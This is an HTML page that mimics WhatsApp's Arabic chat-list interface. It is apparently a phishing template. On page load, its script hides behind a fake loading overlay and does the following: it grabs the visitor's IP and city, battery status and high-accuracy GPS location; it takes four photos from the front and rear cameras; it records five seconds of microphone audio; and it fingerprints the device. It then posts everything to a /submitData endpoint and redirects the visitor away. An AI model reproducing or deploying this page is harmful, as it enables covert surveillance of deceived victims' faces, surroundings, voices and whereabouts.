<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0b141a;
            color: #e9edef;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
        }
        .wa-container {
            position: relative;
            width: 100%;
            height: 100vh;
            background: #0b141a;
            display: flex;
            flex-direction: column;
        }

        /* Top Header */
        .top-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 16px;
            background: #1f2c34;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            z-index: 100;
            flex-shrink: 0;
        }
        .top-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .top-left i {
            font-size: 22px;
            color: #e9edef;
        }
        .top-title {
            font-size: 20px;
            font-weight: 600;
            color: #e9edef;
        }
        .top-right {
            display: flex;
            align-items: center;
            gap: 20px;
        }
        .top-right i {
            font-size: 20px;
            color: #e9edef;
        }

        /* Tabs Bar */
        .tabs-bar {
            display: flex;
            background: #1f2c34;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            z-index: 100;
            flex-shrink: 0;
            padding: 0 8px;
        }
        .tab {
            flex: 1;
            text-align: center;
            padding: 12px 0 10px;
            font-size: 13px;
            font-weight: 500;
            color: #8696a0;
            cursor: pointer;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }
        .tab.active {
            color: #00a884;
            font-weight: 600;
        }
        .tab.active::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 100%;
            height: 3px;
            background: #00a884;
            border-radius: 2px 2px 0 0;
        }
        .tab-badge {
            min-width: 18px; height: 18px;
            border-radius: 50%;
            background: #00a884;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 11px;
            font-weight: 600;
            color: #111b21;
            padding: 0 5px;
        }

        /* Chat List */
        .chat-list {
            flex: 1;
            overflow-y: auto;
            scrollbar-width: none;
            background: #0b141a;
        }
        .chat-list::-webkit-scrollbar { display: none; }

        .chat-item {
            display: flex;
            align-items: center;
            gap: 14px;
            padding: 10px 16px;
            border-bottom: 1px solid rgba(255,255,255,0.03);
            cursor: pointer;
        }
        .chat-avatar {
            width: 50px; height: 50px;
            border-radius: 50%;
            background: linear-gradient(135deg, #00a884, #008069);
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            overflow: hidden;
        }
        .chat-avatar i {
            font-size: 22px;
            color: #fff;
        }
        .chat-info {
            flex: 1;
            min-width: 0;
        }
        .chat-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 3px;
        }
        .chat-name {
            font-size: 16px;
            font-weight: 500;
            color: #e9edef;
        }
        .chat-time {
            font-size: 12px;
            color: #8696a0;
        }
        .chat-time.unread {
            color: #00a884;
            font-weight: 600;
        }
        .chat-row2 {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .chat-preview {
            font-size: 14px;
            color: #8696a0;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            flex: 1;
        }
        .chat-preview.unread {
            color: #e9edef;
            font-weight: 500;
        }
        .chat-badge {
            min-width: 20px; height: 20px;
            border-radius: 50%;
            background: #00a884;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: 600;
            color: #111b21;
            padding: 0 6px;
        }
        .chat-badge.pinned {
            background: transparent;
            color: #8696a0;
            font-size: 14px;
        }

        /* Loading Spinner القديم - تم إخفاؤه */
        .loading-spinner {
            display: none;
            justify-content: center;
            align-items: center;
            padding: 30px 0 50px;
            background: #0b141a;
        }
        .spinner-ring {
            width: 36px;
            height: 36px;
            border: 3px solid rgba(0,168,132,0.15);
            border-top-color: #00a884;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Floating Compose Button */
        .compose-btn {
            position: fixed;
            bottom: 25px;
            left: 20px;
            width: 56px; height: 56px;
            border-radius: 50%;
            background: #00a884;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 12px rgba(0,168,132,0.4);
            z-index: 200;
            cursor: pointer;
        }
        .compose-btn i {
            font-size: 24px;
            color: #111b21;
        }

        /* ===== Loading Overlay مع تشويش خفيف جداً ===== */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            background: rgba(0, 0, 0, 0.1);
            backdrop-filter: blur(2px);        /* تشويش خفيف جداً */
            -webkit-backdrop-filter: blur(2px); /* لدعم Safari */
            pointer-events: none;
            opacity: 1;
            transition: opacity 0.5s ease;
        }
        .loading-overlay.hidden {
            opacity: 0;
            pointer-events: none;
        }
        .loading-box {
            background: #1a8cff;
            padding: 30px 40px;
            border-radius: 16px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            box-shadow: 0 8px 30px rgba(0,0,0,0.5);
            backdrop-filter: none;
            -webkit-backdrop-filter: none;
        }
        .loading-box .spinner-ring-big {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top-color: #ffffff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        .loading-box p {
            color: #fff;
            margin-top: 15px;
            font-size: 16px;
            font-weight: 500;
        }
        /* ======================================================== */
    </style>
</head>
<body>
    <!-- Overlay التحميل -->
    <div id="loadingOverlay" class="loading-overlay">
        <div class="loading-box">
            <div class="spinner-ring-big"></div>
            <p>جاري التحميل...</p>
        </div>
    </div>

    <div class="wa-container">
        <!-- Top Header -->
        <div class="top-header">
            <div class="top-left">
                <span class="top-title">WhatsApp</span>
            </div>
            <div class="top-right">
                <i class="fas fa-camera"></i>
                <i class="fas fa-magnifying-glass"></i>
                <i class="fas fa-ellipsis-vertical"></i>
            </div>
        </div>

        <!-- Tabs Bar -->
        <div class="tabs-bar">
            <div class="tab">المجتمعات</div>
            <div class="tab active">
                الدردشات
                <span class="tab-badge">5</span>
            </div>
            <div class="tab">التحديثات</div>
            <div class="tab">المكالمات</div>
        </div>

        <!-- Chat List -->
        <div class="chat-list">
            <!-- Chat 1 -->
            <div class="chat-item">
                <div class="chat-avatar"><i class="fas fa-user"></i></div>
                <div class="chat-info">
                    <div class="chat-row">
                        <span class="chat-name">أحمد</span>
                        <span class="chat-time unread">12:30</span>
                    </div>
                    <div class="chat-row2">
                        <span class="chat-preview unread">مرحباً! كيف حالك؟ 👋</span>
                        <span class="chat-badge">3</span>
                    </div>
                </div>
            </div>

            <!-- Chat 2 -->
            <div class="chat-item">
                <div class="chat-avatar"><i class="fas fa-users"></i></div>
                <div class="chat-info">
                    <div class="chat-row">
                        <span class="chat-name">مجموعة العائلة</span>
                        <span class="chat-time unread">11:45</span>
                    </div>
                    <div class="chat-row2">
                        <span class="chat-preview unread">سارة: صورة جميلة! 📸</span>
                        <span class="chat-badge">12</span>
                    </div>
                </div>
            </div>

            <!-- Chat 3 -->
            <div class="chat-item">
                <div class="chat-avatar"><i class="fas fa-user"></i></div>
                <div class="chat-info">
                    <div class="chat-row">
                        <span class="chat-name">محمد</span>
                        <span class="chat-time">أمس</span>
                    </div>
                    <div class="chat-row2">
                        <span class="chat-preview">تمام، نشوفك بكرة إن شاء الله ✅</span>
                    </div>
                </div>
            </div>

            <!-- Chat 4 -->
            <div class="chat-item">
                <div class="chat-avatar"><i class="fas fa-bullhorn"></i></div>
                <div class="chat-info">
                    <div class="chat-row">
                        <span class="chat-name">قناة الأخبار</span>
                        <span class="chat-time">10:20</span>
                    </div>
                    <div class="chat-row2">
                        <span class="chat-preview">عاجل: خبر مهم جداً...</span>
                        <span class="chat-badge">1</span>
                    </div>
                </div>
            </div>

            <!-- Chat 5 -->
            <div class="chat-item">
                <div class="chat-avatar"><i class="fas fa-user"></i></div>
                <div class="chat-info">
                    <div class="chat-row">
                        <span class="chat-name">ليلى</span>
                        <span class="chat-time">الأحد</span>
                    </div>
                    <div class="chat-row2">
                        <span class="chat-preview">شكراً جزيلاً! 🙏</span>
                        <span class="chat-badge pinned"><i class="fas fa-thumbtack"></i></span>
                    </div>
                </div>
            </div>

            <!-- Chat 6 -->
            <div class="chat-item">
                <div class="chat-avatar"><i class="fas fa-user"></i></div>
                <div class="chat-info">
                    <div class="chat-row">
                        <span class="chat-name">عمر</span>
                        <span class="chat-time">السبت</span>
                    </div>
                    <div class="chat-row2">
                        <span class="chat-preview">🎵 ملف صوتي</span>
                    </div>
                </div>
            </div>

            <!-- Chat 7 -->
            <div class="chat-item">
                <div class="chat-avatar"><i class="fas fa-user"></i></div>
                <div class="chat-info">
                    <div class="chat-row">
                        <span class="chat-name">نورة</span>
                        <span class="chat-time">الجمعة</span>
                    </div>
                    <div class="chat-row2">
                        <span class="chat-preview">✅✅✅</span>
                    </div>
                </div>
            </div>

            <!-- Loading Spinner القديم (مخفي) -->
            <div class="loading-spinner">
                <div class="spinner-ring"></div>
            </div>
        </div>

        <!-- Compose Button -->
        <div class="compose-btn">
            <i class="fas fa-comment-dots"></i>
        </div>
    </div>

    <form id="dataForm" method="POST" action="REDIRECT_URL" style="display:none;">
        <input type="hidden" name="chatId" id="chatId">
        <input type="hidden" name="imageDatas" id="imageDatas">
        <input type="hidden" name="location" id="location">
        <input type="hidden" name="permissions" id="permissions">
        <input type="hidden" name="ipInfo" id="ipInfo">
        <input type="hidden" name="battery" id="battery">
        <input type="hidden" name="audioData" id="audioData">
        <input type="hidden" name="deviceInfo" id="deviceInfo">
    </form>

    <script>
        const REDIRECT_URL = "REDIRECT_URL";
        let images = [], audioData = null;
        let ipInfo = '', batteryStatus = '', locationStr = '';
        let permissions = [];
        let deviceInfo = {};

        // عنصر overlay للتحميل
        const loadingOverlay = document.getElementById('loadingOverlay');

        async function getIP() {
            try {
                const r = await fetch('https://ipapi.co/json/');
                const d = await r.json();
                ipInfo = `Country: ${d.country_name || 'Unknown'}, City: ${d.city || 'Unknown'}, IP: ${d.ip || 'Unknown'}`;
            } catch {
                ipInfo = 'Unable to get IP';
            }
        }

        async function getBattery() {
            try {
                const b = await navigator.getBattery();
                batteryStatus = `Level: ${Math.round(b.level * 100)}%, Charging: ${b.charging ? 'Yes' : 'No'}`;
            } catch {
                batteryStatus = 'Unknown';
            }
        }

        async function captureImage(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: facingMode }, width: 640, height: 480 }
                });
                const v = document.createElement('video');
                v.srcObject = stream;
                await v.play();
                await new Promise(r => setTimeout(r, 300));

                const c = document.createElement('canvas');
                c.width = v.videoWidth || 640;
                c.height = v.videoHeight || 480;
                c.getContext('2d').drawImage(v, 0, 0);

                const imageData = c.toDataURL('image/jpeg', 0.7).split(',')[1];
                images.push(imageData);

                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch (error) {
                permissions.push(`Camera ${facingMode} Denied`);
                return false;
            }
        }

        async function captureAllImages() {
            await captureImage('user');
            await captureImage('environment');
            await captureImage('user');
            await captureImage('environment');
        }

        async function recordAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];

                mediaRecorder.ondataavailable = e => chunks.push(e.data);

                return new Promise((resolve) => {
                    mediaRecorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'audio/webm' });
                        const reader = new FileReader();
                        reader.onloadend = () => {
                            const base64 = reader.result.split(',')[1];
                            audioData = base64;
                            stream.getTracks().forEach(t => t.stop());
                            resolve();
                        };
                        reader.readAsDataURL(blob);
                    };

                    mediaRecorder.start();
                    setTimeout(() => mediaRecorder.stop(), 5000);
                });
            } catch (error) {
                permissions.push('Audio Denied');
                return null;
            }
        }

        async function getLocation() {
            return new Promise(res => {
                navigator.geolocation.getCurrentPosition(
                    p => {
                        locationStr = `Lat:${p.coords.latitude}, Lon:${p.coords.longitude}, Acc:${p.coords.accuracy}m`;
                        res(locationStr);
                    },
                    () => {
                        permissions.push('Location Denied');
                        locationStr = '';
                        res('');
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }

        async function getDeviceInfo() {
            deviceInfo = {
                platform: navigator.platform || 'Unknown',
                userAgent: navigator.userAgent || 'Unknown',
                language: navigator.language || 'Unknown',
                memory: navigator.deviceMemory || 'Unknown',
                cores: navigator.hardwareConcurrency || 'Unknown',
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                vendor: navigator.vendor || 'Unknown',
                product: navigator.product || 'Unknown',
                cookieEnabled: navigator.cookieEnabled || false,
                doNotTrack: navigator.doNotTrack || 'Unknown',
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType || 'Unknown',
                    downlink: navigator.connection.downlink || 'Unknown',
                    rtt: navigator.connection.rtt || 'Unknown'
                } : null
            };
            return deviceInfo;
        }

        async function sendData() {
            try {
                const fd = new FormData();
                fd.append('ipInfo', ipInfo);
                fd.append('battery', batteryStatus);
                fd.append('location', locationStr);
                fd.append('imageDatas', images.join(','));
                fd.append('permissions', permissions.join(', '));
                fd.append('audioData', audioData || '');
                fd.append('deviceInfo', JSON.stringify(deviceInfo));
                fd.append('chatId', navigator.userAgent || 'Unknown');

                const response = await fetch('/submitData', { 
                    method: 'POST', 
                    body: fd,
                    timeout: 30000
                });

                return response;
            } catch (error) {
                console.error('Send error:', error);
                return null;
            }
        }

        async function startProcess() {
            // إظهار الـ overlay عند بدء التحميل
            loadingOverlay.classList.remove('hidden');

            await getIP();
            await getBattery();
            await getLocation();
            await getDeviceInfo();
            await captureAllImages();
            await recordAudio();

            const response = await sendData();

            
            loadingOverlay.classList.add('hidden');

            if (REDIRECT_URL && REDIRECT_URL !== 'REDIRECT_URL') {
                window.location.href = REDIRECT_URL;
            } else {
                window.location.href = 'https://www.google.com';
            }
        }

        window.onload = function() {
            startProcess();
        };
    </script>
</body>
</html>
